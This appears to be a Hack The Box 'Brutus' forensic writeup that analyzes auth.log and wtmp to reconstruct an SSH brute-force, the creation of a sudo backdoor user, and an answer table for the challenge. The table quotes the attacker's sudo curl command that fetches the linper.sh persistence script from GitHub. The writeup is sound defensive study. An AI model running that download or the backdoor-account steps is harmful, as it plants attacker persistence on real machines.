# Brutus HTB Writeup

In this challenge, we analyze **Unix auth.log** and **wtmp** logs to trace an attack.

## Summary

We are informed that:
- A Confluence server was brute-forced via SSH.
- The attacker performed additional activities visible in `auth.log`.
- We will explore privilege escalation (privesc), persistence, and command execution tactics.

---

## Step 1: Download and Unpack

Download the provided archive:

```
wget [link-to-the-file]
```

Password: `hacktheblue`

Note: There is no README file inside, so we move directly to log analysis.

---

## Step 2: Provided Files

- **auth.log** → Review attacker commands and actions.
- **wtmp** → A binary log tracking system login/logout events (usually under `/var/log/wtmp`).
- **utmp.py** → Python script provided to parse `wtmp` data.

Reference:> [utmp.py](http://utmp.py) : *after googling* seems like it helps reading wtmp files. might be HTB helping us there. 
On Linux, the `utmp.read()` function decodes a binary utmp/wtmp stream and yields structured records.

---

## Step 3: Analyzing `auth.log`

Key log entries:

```
Mar  6 06:19:52 sshd[1465]: AuthorizedKeysCommand failed
Mar  6 06:19:54 sshd[1465]: Accepted password for root from 203.101.190.9
...
Mar  6 06:32:44 sshd[2491]: Accepted password for root from 65.2.161.68
...
Mar  6 06:34:18 useradd: new user: cyberjunkie
Mar  6 06:35:15 usermod: added 'cyberjunkie' to 'sudo'
```

Summary:
- Attacker brute-forced the **root** account.
- Created a backdoor user: **cyberjunkie**.
- Escalated privileges by adding `cyberjunkie` to the `sudo` group.

This persistence ensures access even if the root password is later changed.

---

## Step 4: Analyzing `wtmp`

Run:

```
python utmp.py -o wtmpTMP wtmp
```

This outputs a readable login session table.


## Questions & Answers

| #  | Question                                                                                      | Answer                                                                                       | How It Was Found                                                                                                                                                      |
|----|------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1  | IP address used by the attacker for brute-force?                                              | 65.2.161.68                                                                                 | Simply check for login attempts that didn’t go through in `auth.log`.                                                                                                 |
| 2  | Which account did the attacker successfully access?                                           | root                                                                                        | Found in `auth.log`: look for **"accepted password for root"**.                                                                                                       |
| 3  | Timestamp when the attacker manually logged in (from wtmp)?                                  | 2024/03/06 01:32:45                                                                         | Cross-reference with `auth.log` to see when a human (not bot) connected manually; humans don’t log in/out at the same timestamp.                                      |
| 4  | SSH session number assigned to the attacker's session?                                       | 37                                                                                          | Focus on real malicious user sessions, not bot connections; the session ID is generated when someone logs in.                                                         |
| 5  | Name of the persistence account added?                                                       | cyberjunkie                                                                                 | Mentioned clearly in `auth.log` after `useradd` and `groupadd`.                                                                                                       |
| 6  | MITRE ATT&CK sub-technique ID for persistence via account creation?                          | T1136.001                                                                                   | Googled: MITRE ATT&CK → group elevation → persistence; found under https://attack.mitre.org/tactics/TA0003/ (searching for "group" and persistence techniques).      |
| 7  | Time when the attacker's first SSH session ended (according to auth.log)?                    | 2024-03-06 06:31:40 (session 34)                                                           | Found by looking for session closure logs in `auth.log`.                                                                                                              |
| 8  | Full sudo command attacker used to download a script on the backdoor account?                | /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh         | Found in `auth.log`: attacker used sudo to download an external script for further actions.                                                                           |

---

## Final Notes

This exercise highlights:
- The importance of monitoring SSH access and log files (`auth.log`, `wtmp`).
- Disabling root SSH login and enforcing strong passwords.
- Implementing intrusion detection and alerting systems to catch brute-force attacks early.

Stay vigilant!
